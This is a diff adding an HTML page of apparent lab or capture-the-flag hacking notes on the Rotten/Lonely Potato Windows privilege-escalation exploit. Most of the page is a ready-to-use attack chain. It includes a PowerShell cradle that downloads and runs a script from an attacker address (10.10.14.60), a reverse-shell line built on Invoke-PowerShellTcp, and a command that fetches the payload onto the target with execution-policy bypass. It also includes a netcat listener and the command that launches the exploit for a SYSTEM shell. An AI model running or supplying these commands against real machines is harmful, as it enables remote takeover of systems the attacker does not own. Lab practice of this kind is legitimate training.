@@ -1,0 +1,8 @@
+<!doctype html><html>
+    <head>
+      <meta http-equiv="content-type" content="text/html; charset=utf-8">
+      <title>Rotten Potato</title>
+      <meta name="generator" content="CherryTree">
+      <link rel="stylesheet" href="res/styles3.css" type="text/css" />
+    </head>
+    <body><div class='page'><h1 class='title'>Rotten Potato</h1><br/>Try to avoid this. Juicy potato is less handsy and has a higher success rate.<br /><br /><a href="https://github.com/decoder-it/lonelypotato">https://github.com/decoder-it/lonelypotato</a>  has a compiled version of the exploit<br /><a href="https://www.puckiestyle.nl/htb-bounty/">https://www.puckiestyle.nl/htb-bounty/</a>        has a great rightup on the use of lonely potato (even though they call it rotten potato)<br /><br />1.<br />make a file named rev.bat with the contents<br />    powershell.exe -c &quot;iex(new-object net.webclient).downloadstring(&#39;<a href="http://10.10.14.60:8000/ye32.ps1')"">http://10.10.14.60:8000/Invoke-PowerShellTcp.ps1&#39;)&quot;</a><br />2.<br />add a line to the bottom of Invoke-PowerShellTcp.ps1<br />    Invoke-PowershellTcp -Reverse -IPAddress 10.10.14.60 -port 3232<br />3.<br />pull lonely potato and rev.bat to the target<br />    powershell.exe -exec Bypass &quot;IEX (New-Object Net.WebClient).Downloadfile(&#39;<a href="http://10.10.14.60:8000/rev.bat',">http://10.10.14.60:8000/rev.bat&#39;,</a> &#39;C:\users\kohsuke\appdata\local\temp\rev.bat&#39;)&quot;<br />4.<br />start nc listener<br />    nc -nlvp 3232<br />5.<br />execute the lonely potato exploit (renamed to rp.exe)<br />    C:\users\kohsuke\appdata\local\temp\rp.exe * C:\users\kohsuke\appdata\local\temp\rev.bat<br />6.<br />    enjoy your system shell!</div></body></html>
